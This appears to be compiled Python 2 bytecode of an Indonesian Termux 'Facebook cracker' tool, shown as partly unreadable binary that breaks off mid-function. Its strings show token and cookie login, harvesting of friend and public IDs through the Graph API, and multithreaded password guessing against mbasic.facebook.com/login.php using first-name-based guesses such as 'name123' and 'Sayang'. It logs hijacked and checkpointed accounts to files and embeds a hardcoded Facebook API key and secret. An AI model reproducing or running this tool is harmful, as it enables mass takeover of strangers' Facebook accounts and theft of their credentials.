�
j0`c           @   sA  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 m
 Z
 d  d l m Z e
 e � e j d � y d  d l Z Wn e k
 r� e  j d � n Xy d  d l Z Wn e k
 re  j d � n Xy d  d l Z Wn+ e k
 rNe  j d � e  j d � n Xd  d	 l m Z e j �  Z e j e � e j e j j �  d
 d �dV g e _ dW g e _ e  j d � e Z d �  Z e j d e � Z e j �  e j  d � e! Z d �  Z" d �  Z# d Z$ e j  d � d Z% d Z& g  Z' g  Z( g  a) g  Z* g  a+ g  Z, g  Z- g  Z. g  Z/ g  Z0 g  Z1 d Z2 d Z3 e  j d � d GHe j  d � d GHe j  d � d GHe j  d � d GHe j  d � e# d  � e# d! � e# d" � e# d# � d GHe j  d � d$ �  Z4 d% �  Z5 d& �  Z6 d' Z7 d' Z8 d( Z9 xw e9 d( k r�e: d) � Z/ e/ e7 k r�e: d* � Z; e; e8 k r�e5 �  d+ Z9 q�d, GHe  j d- � q5d, GHe  j d- � q5Wd. �  Z< d/ �  Z= d0 �  Z> d1 �  Z? d2 �  Z@ d3 �  ZA d4 �  ZB d5 �  ZC d6 �  ZD d7 �  ZE d8 �  ZF d9 �  ZG d: �  ZH d; �  ZI d< �  ZJ d= �  ZK d> �  ZL d? �  ZM d@ �  ZN dA �  ZO dB �  ZP dC �  ZQ dD �  ZR dE �  ZS dF �  ZT dG �  ZU dH �  ZV dI �  ZW dJ �  ZX dK �  ZY dL �  ZZ dM �  Z[ dN �  Z\ dO �  Z] dP �  Z^ dQ �  Z_ dR �  Z` dS �  Za eb dT k r=e  j d � e# dU � e6 �  eD �  e< �  n  d S(X   i����N(   t
   ThreadPool(   t   ConnectionErrort   utf8s   pip2 install mechanizes   pip2 install bs4s   pip2 install requestss   python2 fb.pyc(   t   Browsert   max_timei   s
   User-Agents�  Mozilla/5.0 (Linux; Android 9; Infinix X652B Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171848;FBDM/{density=2.0,width=720,height=1428};FBLC/en_US;FBRV/243389251;FBCR/Warid;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X652B;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]t   clearc          C   s  x� t  j d d d d g � D]� }  t r, Pn  t j j d |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  � t j j �  t j d � q Wd  S(   Ns   [0;91m.s   [0;93m.s   
[0;97mLoading g�������?(	   t	   itertoolst   cyclet   donet   syst   stdoutt   writet   flusht   timet   sleep(   t   c(    (    s   /sdcard/fbcrack1.pyt   animate!   s    "�
t   targeti   c           C   s   d GHt  j j �  d  S(   Ns(   [0;91m•[0;93m Sampai Jumpa :)[0;97m(   t   osR	   t   exit(    (    (    s   /sdcard/fbcrack1.pyt   keluar/   s    c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g���Q��?(   R	   R
   R   R   R
   R   (   t   zt   e(    (    s   /sdcard/fbcrack1.pyt   jalan4   s    
sr  
[1;91m ╔═╗╔═╗╔═╗╔═╗╔╗ ╔═╗╔═╗╦╔═  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗
[1;91m ╠╣ ╠═╣║  ║╣ ╠╩╗║ ║║ ║╠╩╗  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝
[1;91m ╚  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝╩ ╩  ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═
[1;94m─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─
[0;97m([0;91m•[0;97m) [0;97mAuthor   [0;91m• [0;97m-
[0;97m([0;91m•[0;97m) [0;97mFacebook [0;91m• [0;97mBagasXD   
[0;97m([0;91m•[0;97m) [0;97mWhatsAp  [0;91m• [0;97m08237164818× 
[0;94m─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─
[1;91m ╔═╗╔═╗╔═╗╔═╗╔╗ ╔═╗╔═╗╦╔═  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗
[1;91m ╠╣ ╠═╣║  ║╣ ╠╩╗║ ║║ ║╠╩╗  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝
[1;91m ╚  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝╩ ╩  ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═
[1;94m─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─
[0;97m([0;91m•[0;97m) [0;97mAuthor   [0;91m• [0;97mCyber Lampung  
[0;97m([0;91m•[0;97m) [0;97mFacebook [0;91m• [0;97mBagasXD   
[0;97m([0;91m•[0;97m) [0;97mWhatsAp  [0;91m• [0;97m0811781*****
[0;94m─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─ ─═─i    s   Not Vulnt   Vulns�   
[0;91m ╔═╗╔═╗╔═╗╔═╗╔╗ ╔═╗╔═╗╦╔═  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗s{   [0;91m ╠╣ ╠═╣║  ║╣ ╠╩╗║ ║║ ║╠╩╗  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝s�   [0;91m ╚  ╩ ╩╚═╝╚═╝╚═╝╚═╝╚═╝╩ ╩  ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═ s�   [0;94m─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─•─sB   [0;91m• [0;97mJangan Lupa Join Grup Di Bawah Ini Ya Anjenk !  s0   [0;91m• [0;97mGroup1 : 💜 RATU ERROR 💜 s    [0;91m• [0;97mGroup2 : VIRALs.   [0;91m• [0;97mTeam   : RATU ERROR PROJECT c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... sC   
[0;97m([0;94m•[1;97m)[0;97m Harap Sabar Sedang masuk[0;97m i   (   R	   R
   R   R
   R   (   t   titikt   o(    (    s   /sdcard/fbcrack1.pyt   tik\   s
    

c       	   C   sX   d d d d d d d d d g	 }  x0 |  D]( } d | Gt  j j �  t j d	 � q( Wd  S(
   Ns   [0;91m.   s   [0;91m.[0;93m.  s   [0;91m.[0;93m.[0;92m. s   [0;92m.   s        s   [0;92m... s   [0;92mSucces ✓ s3   
[0;97m([0;94m•[0;97m)[0;97m Wait bro[0;97m i   (   R	   R
   R   R
   R   (   t   totokt   u(    (    s   /sdcard/fbcrack1.pyt   toke   s
    !

c          C   s>   d d d g }  x( |  D]  } t  j j �  t j d � q Wd  S(   Ns   !  i   (   R	   R
   R   R
   R   (   t   sosokR   (    (    s   /sdcard/fbcrack1.pyt   sokl   s    

s
   BagasXDt   trues4   [0;97m([0;93m?[0;97m) Username [0;91m>>> [0;93ms4   [0;97m([0;93m?[0;97m) Password [0;91m>>> [0;93mt   falses*   [0;97m([0;91m![0;97m) Salah Sayangkuh !s+   xdg-open https://www.facebook.com/Romi.Uyeyc           C   s�   t  j d � t GHd d GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d	 GHt j d � d d GHt j d � t �  d  S(
   NR   i2   s
   [0;91m─g�Q���?s%   [0;97m1).[0;97m Login Akun Facebooks*   [0;97m2).[0;97m Login Via Token Facebooks+   [0;97m3).[0;97m Login Via Cookie Facebooks'   [0;97m4).[0;97m Ambil Token Dari Links   [0;91m0[0;97m).[0;97m Keluar(   R   t   systemt   logoR
   R   t   pilih_masuk(    (    (    s   /sdcard/fbcrack1.pyt   masuk�   s"    
	





	
c          C   s�   t  d � }  |  d k r' d GHt �  nz |  d k r= t �  nd |  d k rS t �  nN |  d k ri t �  n8 |  d k r t �  n" |  d k r� t �  n d GHt �  d  S(	   Ns/   [0;97m([0;93m?[0;97m) Pilih [0;94m>[0;97m t    s-   [0;97m([0;91m![0;97m) Isi Yg Benar Sayang!t   1t   2t   3t   4t   0(   t	   raw_inputR%   t   login_fbt   login_tokent   login_cookiet
   ambil_linkR   (   t   msuk(    (    s   /sdcard/fbcrack1.pyR%   �   s     





c           C   sW   t  j d � t GHd d GHt d � t d � t d � t d � d d GHt �  d  S(   NR   i2   s
   [0;91m─s3   [0;93m                  PERINGATAN [0;91m![0;93ms9   
[0;93m Anda harus menggunakan akun facebook baru untuk s7   [0;93m login dan harus menggunakan Vpn server Amerika s=   [0;93m agar tidak terkena chekpoint nanti nya paham ![0;93m(   R   R#   R$   R   t   fb_login(    (    (    s   /sdcard/fbcrack1.pyR.   �   s    
	



	c          C   s{   t  d � }  |  d k r' d GHt �  nP |  d k s? |  d k rI t �  n. |  d k sa |  d k rk t �  n d GHt �  d  S(   NsC   [0;97m Apakah anda yakin [0;92mY[0;97m/[0;93mN [0;91m>[0;97m R'   s.    [0;97m([0;91m![0;97m) Isi Yg Benar Sayang!t   Yt   yt   Nt   n(   R-   R3   t   loginR&   (   t   fb(    (    s   /sdcard/fbcrack1.pyR3   �   s    


c          C   s�  t  j d � y t d d � }  t �  Wnrt t f k
 r�t  j d � t GHd d GHd GHt d � } t d � } t �  y t	 j d	 � Wn  t
 j k
 r� d
 GHt �  n Xt
 t	 j _ t	 j d d � | t	 j d
 <| t	 j d <t	 j �  t	 j �  } d | k r=yd | d | d } i d d 6d d 6| d
 6d d 6d d 6d d 6d d 6d d 6| d 6d  d! 6d" d# 6} t j d$ � } | j | � | j �  } | j i | d% 6� d& } t j | d' | �} t j | j � }	 t d d( � }
 |
 j |	 d) � |
 j �  d* GHt �  Wq=t j j  k
 r9d
 GHt �  q=Xn  d+ | k rrd, GHt  j d- � t! j" d. � t �  q�d/ GHt  j d- � t! j" d. � t# �  n Xd  S(0   NR   s	   login.txtt   ri2   s
   [0;91m─s8   [0;97m([0;94m•[0;97m) Login Account Facebook Anda !s2   [0;97m([0;93m?[0;97m) No/Email [0;91m: [0;93ms2   [0;97m([0;93m?[0;97m) Password [1;91m: [0;93ms   https://m.facebook.coms.   
[0;97m([0;91m![0;97m) Koneksi Bermasalah !t   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR(   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR,   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramst   wt   access_tokens3   [0;97m([0;92m✓[1;97m)[0;92m Login Berhasil ! t
   checkpoints8   
[0;97m([0;91m![0;97m) Akun Anda Terkena Checkpoint !s   rm -rf login.txti   s(   
[0;97m([0;91m![0;97m) Ada Yg Salah !($   R   R#   t   opent   menut   KeyErrort   IOErrorR$   R-   R   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR   t   closet
   exceptionsR   R
   R   R&   (   t   tokett   idt   pwdt   urlRL   t   datat   xt   aR:   R   t   unikers(    (    s   /sdcard/fbcrack1.pyR8   �   sf    

	


S






c          C   s�   t  j d � t GHd d GHt d � }  yj t j d |  � } t j | j � } | d } t	 d d � } | j
 |  � | j �  t d	 � t
 �  WnL t k
 r� d
 GHt j d � t �  n# t j j k
 r� d GHt �  n Xd  S(
   NR   i2   s
   [0;91m─s/   [0;97m([0;93m?[0;97m) Token [0;94m>[0;93m s+   https://graph.facebook.com/me?access_token=t   names	   login.txtRN   s3   [0;97m([0;92m✓[0;97m)[0;92m Login Berhasil ! s&   [0;97m([0;91m![0;97m) Token salah !g333333�?s+   [0;97m([0;91m![0;97m) Koneksi Bermasalah(   R   R#   R$   R-   Rc   Rd   Re   Rf   Rg   RQ   R   Rh   R   RR   RS   R
   R   R&   Ri   t   SSLErrorR   (   Rj   t   otwRp   t   namat   zedd(    (    s   /sdcard/fbcrack1.pyR/      s(    
	






c          C   s�  t  j d � t GHd GHt j d � y� t d � }  i
 d d 6d d 6d	 d
 6d d 6d
 d 6d d 6d d 6d d 6d d 6|  d 6} t j d d | �} t j	 d | j
 � } | j d � } t d d � } | j
 | � | j �  t d � t j d � t �  Wn� t k
 r)d  GHt j d � t �  nY t k
 rRd  GHt j d � t �  n0 t j j k
 r�t  j d � d! GHt �  n Xd  S("   NR   s�   [0;91m──────────────────────────────────────────────────g�Q���?s0   [0;97m([0;93m?[0;97m) Cookie [0;94m>[0;93m sl   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR(   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s
   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typet   cookiesG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_t   headerss	   (EAAA\w+)i   s	   login.txtRN   s3   [0;97m([0;92m✓[0;97m)[0;92m Login Berhasil ! i   s'   [0;97m([0;91m![0;97m) Cookie salah !s+   [0;97m([0;91m![0;97m) Koneksi Bermasalah(   R   R#   R$   R
   R   R-   Rc   Rd   t   ret   searchRg   t   groupRQ   R   Rh   R   RR   t   AttributeErrorR&   t   UnboundLocalErrorRi   Rs   R   (   R{   Rn   t   cokit   carit   hasilRv   (    (    s   /sdcard/fbcrack1.pyR0     sH    













c           C   sQ   t  j d � t GHt j d � d d GHt d � t  j d � t �  t �  d  S(   NR   g�Q���?i2   s
   [0;91m─s@   
     [0;93m---[0;91m>[0;93m Anda Akan Di Arahkan Ke Browser sL   xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed(   R   R#   R$   R
   R   R   R    R&   (    (    (    s   /sdcard/fbcrack1.pyR1   >  s    

	

c          C   sZ  t  j d � y t d d � j �  }  Wn7 t k
 r_ d GHt  j d � t  j d � t �  n Xy= t j d |  � } t j	 | j
 � } | d } | d } Wnz t k
 r� t  j d � d	 GHt  j d � t j
 d
 � t �  t j
 d
 � t �  n# t j j k
 rd GHt �  n Xt  j d � t GHt j
 d � d
 GHt j
 d � d | GHt j
 d � d | GHt j
 d � d
 GHt j
 d � d GHt j
 d � d GHt j
 d � d GHt j
 d � d GHt j
 d � d GHt j
 d � d GHt j
 d � d GHt j
 d � d GHt j
 d � d GHt j
 d � d GHt j
 d � d
 GHt j
 d � t �  d  S(   NR   s	   login.txtR:   s'   [0;97m([0;91m![0;97m) Token Invalid s   rm -rf login.txts,   https://graph.facebook.com/me/?access_token=Rr   Rk   s&   [0;97m([0;91m![0;97m) Token invalidi   s*   [0;97m([0;91m![0;97m) Tidak ada koneksig�Q���?s�   [0;91m──────────────────────────────────────────────────s3   [0;97m([0;91m•[0;97m) Nama   [0;91m >[0;93m s3   [0;97m([0;91m•[0;97m) User Id[0;91m >[0;93m s   [0;97m1).[0;97m Pilih Negaras,   [0;97m2).[0;97m Crack Password List Manuals,   [0;97m3).[0;97m Crack Dari Total Followerss   [0;97m4).[0;97m Dump IDs.   [0;97m5).[0;97m Cari ID Menggunakan Usernames#   [0;97m6).[0;97m Lihat Hasil Cracks$   [0;97m7).[0;97m Follow My Facebooks   [0;97m8).[0;97m Join Groups!   [0;97m9).[0;97m Perbarui Scripts$   [0;91m0[0;97m).[0;97m Keluar Akun(   R   R#   RQ   t   readRT   R&   Rc   Rd   Re   Rf   Rg   RS   R
   R   Ri   R   R   t   logo2t
   pilih_menu(   Rj   Rt   Rp   Ru   Rk   (    (    s   /sdcard/fbcrack1.pyRR   _  st    













	
	












c          C   s2  t  d � }  |  d k r' d GHt �  n|  d k r= t �  n� |  d k rS t �  n� |  d k ri t �  n� |  d k r t �  n� |  d k r� t �  n� |  d	 k r� t �  n� |  d
 k r� t �  nm |  d k r� t	 �  nW |  d k r� t
 �  nA |  d
 k r"d GHt j d � t
 j d � t �  n d GHt �  d  S(   Ns/   [0;97m([0;93m?[0;97m) Pilih [0;94m>[0;93m R'   s%   [0;97m([0;91m![0;97m) Isi Yg BenarR(   R)   R*   R+   t   5t   6t   7t   8t   9R,   s'   [0;97m([0;91m![0;97m) Succes Keluar i   s   rm -rf login.txts'   [0;97m([0;91m![0;97m) Isi Yg Benar !(   R-   R�   t   crack_temant   manualt   crack_followt   dumpt   cari_idt   hasil_crackt
   ikuti_sayaR   t   perbaruiR
   R   R   R#   R   (   t   peler(    (    s   /sdcard/fbcrack1.pyR�   �  s:    












c           C   s�   t  j d � t GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d GHt j d � d	 GHt j d � d GHt j d � t �  d  S(
   NR   g�Q���?s�   [0;91m──────────────────────────────────────────────────s$   [0;97m1).[0;97m Crack ID Indonesias%   [0;97m2).[0;97m Crack ID Bangladeshs#   [0;97m3).[0;97m Crack ID Pakistans    [0;97m4).[0;97m Crack ID Indias   [0;97m5).[0;97m Crack ID Usas    [0;91m0[0;97m).[0;91m Kembali(   R   R#   R�   R
   R   t   pilih_teman(    (    (    s   /sdcard/fbcrack1.pyR�   �  s(    









c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k r= t �  nz |  d k rS t �  nd |  d k ri t �  nN |  d k r t �  n8 |  d k r� t �  n" |  d	 k r� t �  n d GHt �  d  S(
   Ns/   [0;97m([0;93m?[0;97m) Pilih [0;94m>[0;93m R'   s'   [1;97m([1;91m![1;97m) Isi Yg Benar !R(   R)   R*   R+   R�   R,   (   R-   R�   t
   crack_indot   crack_banglat   crack_pakist   crack_hindit	   crack_usaRR   (   t   uki(    (    s   /sdcard/fbcrack1.pyR�   �  s$    






c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt j d � d	 GHt j d � d
 GHt j d � d GHt j d � d GHt j d � d GHt j d � t
 �  d  S(
   NR   s	   login.txtR:   s(   [1;97m([1;91m![1;97m) Token Invalid !s   rm -rf login.txti   s�   [0;91m──────────────────────────────────────────────────g�Q���?s)   [0;97m1).[0;97m Crack Dari Daftar Temans)   [0;97m2).[0;97m Crack Dari Publik/Temans!   [0;97m3).[0;97m Crack Dari Files    [0;91m0[0;97m).[0;91m Kembali(   R   R#   RQ   R�   Rj   RT   R
   R   R   R�   t
   pilih_indo(    (    (    s   /sdcard/fbcrack1.pyR�   �  s.    










c          C   s
  t  d � }  |  d k r' d GHt �  n|  d k r� t j d � t GHd GHt j d � t j d t	 � } t
 j | j � } x�| d	 D] } t
 j | d
 � q� Wn�|  d k r�t j d � t GHd GHt j d � t  d � } t j d � y> t j d
 | d t	 � } t
 j | j � } d | d GHWnI t k
 rUd GHt  d � t �  n# t j j k
 rwd GHt �  n Xt j d
 | d t	 � } t
 j | j � } x,| d	 D] } t
 j | d
 � q�Wn|  d k s�|  d k r�t j d � t GHyb d GHt j d � t  d � } t j d � x0 t | d � j �  D] }	 t
 j |	 j �  � q<WWq�t k
 r|d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d k r�t �  n d GHt �  d  t t t
 � � GHt j d � d! d" d# g }
 x0 |
 D]( } d$ | Gt j j �  t j d% � qWd& GHt j d � d' GHt j d � d( GHt j d � d) GHt j d � d GHt j d � d* �  } t d+ � }
 |
 j | t
 � d, GHd- GHd. t t t  � � d/ t t t! � � GHd0 GHd1 d2 GHt  d � t" �  d  S(3   Ns   [1;97m(?) Pilih [94m>[1;97m R'   s'   [1;97m([1;91m![1;97m) Isi Yg Benar !R(   R   s�   [0;91m──────────────────────────────────────────────────g�Q���?s3   https://graph.facebook.com/me/friends?access_token=Rn   Rk   R)   s5   [1;97m([0;94m•[0;97m) ID Publik [0;91m:[0;97m s   https://graph.facebook.com/s   ?access_token=s0   [1;97m([0;94m•[0;97m) Nama [0;91m:[0;97m Rr   s.   [1;97m([1;91m![1;97m) Id publik tidak ada !s   
[1;97m([1;91mKembali[1;97m)s*   [1;97m([1;91m![1;97m) Tidak ada koneksis   /friends?access_token=R*   t   03s<   [1;97m([1;94m•[1;97m) [1;97mNama File[1;91m :[1;97m R:   s*   [1;97m([1;91m![1;97m) File tidak ada ! s   [1;97m([1;91mKembali[1;97m) s)   [1;97m([1;91m![1;97m) File tidak ada !s    
[1;97m([1;91mKembali[1;97m) R,   t   00s%   [1;97m([1;91m![1;97m) Isi Yg Benars4   [0;97m([0;94m•[0;97m) Total Id[1;91m :[1;97m s   .   s   ..  s   ... s$   
([0;94m•[0;97m) Crack Berjalan i   s�   
[0;91m──────────────────────────────────────────────────s9   [0;97m  Lama Hasil Gunakan Mode Perawan 3 Detik Joss👍s4   [0;97m    Untuk Menghentikan Proses, Tekan CTRL + zs7   [0;97m  Sedang Proses Mohon Bersabar, Semoga Beruntungc         S   s"  |  } y t  j d � Wn t k
 r* n Xy�t j d | d t � } t j | j � } | d d } t j	 d d i | d 6| d	 6d
 d 6d i d
 d 6�} | j
 } d | k s� d | k r d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�d | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�| d d }	 t j	 d d i | d 6|	 d	 6d
 d 6d i d d 6�} | j
 } d | k s�d | k rPd | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � n�d | k r�d | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � nX| d d }
 t j	 d d i | d 6|
 d	 6d
 d 6d i d  d 6�} | j
 } d | k s!d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n�d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n(d! } t j	 d d i | d 6| d	 6d
 d 6d i d" d 6�} | j
 } d | k sId | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � nk d | k rd | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n  Wn n Xd  S(#   NR   s   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s%   https://mbasic.facebook.com/login.phpRn   R<   R=   R]   R8   R|   si   Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1s
   user-agentt   mbasic_logout_buttons   save-devices   [0;92m[OK][0;97m s    [0;92m◊ [0;97mRr   s
   done/indo.txtRp   s   
[OK] s    ◊ RP   s   [0;93m[CP][0;97m s    [0;91m◊[0;97m s    [0;91m◊ [0;97ms   
[CP] t   12345s�   Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36t   1234s�   Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36t   Sayangs�   Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36(   R   t   mkdirt   OSErrorRc   Rd   Rj   Re   Rf   Rg   t   postt   contentRQ   R   Rh   t   okst   appendt   cekpoint(   t   argt   emt   anRJ   t   pwt   rext   xot   oket   cekt   pw2t   pw3t   pw4(    (    s   /sdcard/fbcrack1.pyt   main^  s�    
7	

7	

7	

7	

i   s�   
[0;94m──────────────────────────────────────────────────s-   [1;97m([1;94m•[1;97m) [1;97mSelesai ...sS   [1;97m([1;94m•[1;97m) [1;97mTotal [1;92mOK[1;97m/[1;93mCP [1;97m: [1;92ms   [1;97m/[1;93ms]   [1;97m([1;94m•[1;97m) [1;97mSalin hasil crack lalu simpan[1;91m : [1;97mdone indo.txti2   s
   [1;94m─(#   R-   R�   R   R#   R�   R
   R   Rc   Rd   Rj   Re   Rf   Rg   Rk   R�   RS   R�   Ri   R   R   RQ   t	   readlinest   stripRT   R�   t   strt   lenR	   R
   R   R    t   mapR�   R�   RR   (   t   teakR:   R   t   st   idtt   pokt   spt   it   idlistt   lineR   R   R�   t   p(    (    s   /sdcard/fbcrack1.pyR�     s�    
























	L)	
c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHt j d � d	 GHt j d � d
 GHt j d � d GHt j d � d GHt j d � d GHt j d � t
 �  d  S(
   NR   s	   login.txtR:   s&   [1;97m([1;91m![1;97m) Token Invalids   rm -rf login.txti   s�   [0;91m──────────────────────────────────────────────────g�Q���?s)   [0;97m1).[0;97m Crack Dari Daftar Temans)   [0;97m2).[0;97m Crack Dari Publik/Temans!   [0;97m3).[0;97m Crack Dari Files    [0;91m0[0;97m).[0;91m Kembali(   R   R#   RQ   R�   Rj   RT   R
   R   R   R�   t   pilih_bangla(    (    (    s   /sdcard/fbcrack1.pyR�   �  s.    










c          C   s
  t  d � }  |  d k r' d GHt �  n|  d k r� t j d � t GHd GHt j d � t j d t	 � } t
 j | j � } x�| d	 D] } t
 j | d
 � q� Wn�|  d k r�t j d � t GHd GHt j d � t  d � } t j d � y> t j d
 | d t	 � } t
 j | j � } d | d GHWnI t k
 rUd GHt  d � t �  n# t j j k
 rwd GHt �  n Xt j d
 | d t	 � } t
 j | j � } x,| d	 D] } t
 j | d
 � q�Wn|  d k s�|  d k r�t j d � t GHyb d GHt j d � t  d � } t j d � x0 t | d � j �  D] }	 t
 j |	 j �  � q<WWq�t k
 r|d GHt  d � q�t k
 r�d GHt  d � t �  q�Xn. |  d k s�|  d k r�t �  n d GHt �  d t t t
 � � GHt j d � d  d! d" g }
 x0 |
 D]( } d# | Gt j j �  t j d$ � qWd% GHt j d � d& GHt j d � d' GHt j d � d( GHt j d � d GHt j d � d) �  } t d* � }
 |
 j | t
 � d+ GHd, GHd- t t t  � � d. t t t! � � GHd/ GHd0 d1 GHt  d2 � t" �  d  S(3   Ns   [1;97m(?) Pilih [94m>[1;97m R'   s%   [1;97m([1;91m![1;97m) Isi Yg BenarR(   R   s�   [0;91m──────────────────────────────────────────────────g�Q���?s3   https://graph.facebook.com/me/friends?access_token=Rn   Rk   R)   s5   [1;97m([0;94m•[0;97m) ID Publik [0;91m:[0;97m s   https://graph.facebook.com/s   ?access_token=s0   [1;97m([0;94m•[0;97m) Nama [0;91m:[0;97m Rr   s,   [1;97m([1;91m![1;97m) ID publik tidak adas   
[1;97m([1;91mKembali[1;97m)s*   [1;97m([1;91m![1;97m) Tidak ada koneksis   /friends?access_token=R*   R�   s<   [1;97m([1;94m•[1;97m) [1;97mNama File[1;91m :[1;97m R:   s*   [1;97m([1;91m![1;97m) File tidak ada ! s   ([1;91mKembali[1;97m)s)   [1;97m([1;91m![1;97m) File tidak ada !s   
([1;91mKembali[1;97m)R,   R�   s5   [0;97m([0;94m•[0;97m) Total ID[1;91m  :[1;97m s   .   s   ..  s   ... s$   
([0;94m•[0;97m) Crack Berjalan i   s�   
[0;91m──────────────────────────────────────────────────s9   [0;97m  Lama Hasil Gunakan Mode Perawan 3 Detik Joss👍s4   [0;97m    Untuk Menghentikan Proses, Tekan CTRL + zs7   [0;97m  Sedang Proses Mohon Bersabar, Semoga Beruntungc         S   s"  |  } y t  j d � Wn t k
 r* n Xy�t j d | d t � } t j | j � } | d d } t j	 d d i | d 6| d	 6d
 d 6d i d
 d 6�} | j
 } d | k s� d | k r d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�d | k r�d | d | d | d GHt d d � } | j d | d | � | j
 �  t j | � n�| d d }	 t j	 d d i | d 6|	 d	 6d
 d 6d i d
 d 6�} | j
 } d | k s�d | k rPd | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � n�d | k r�d | d |	 d | d GHt d d � } | j d | d |	 � | j
 �  t j | � nX| d d }
 t j	 d d i | d 6|
 d	 6d
 d 6d i d
 d 6�} | j
 } d | k s!d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n�d | k r�d | d |
 d | d GHt d d � } | j d | d |
 � | j
 �  t j | � n(d } t j	 d d i | d 6| d	 6d
 d 6d i d
 d 6�} | j
 } d | k sId | k r�d | d  | d | d GHt d d � } | j d | d | � | j
 �  t j | � nk d | k rd | d | d | d GHt d d � } | j d | d | � | j
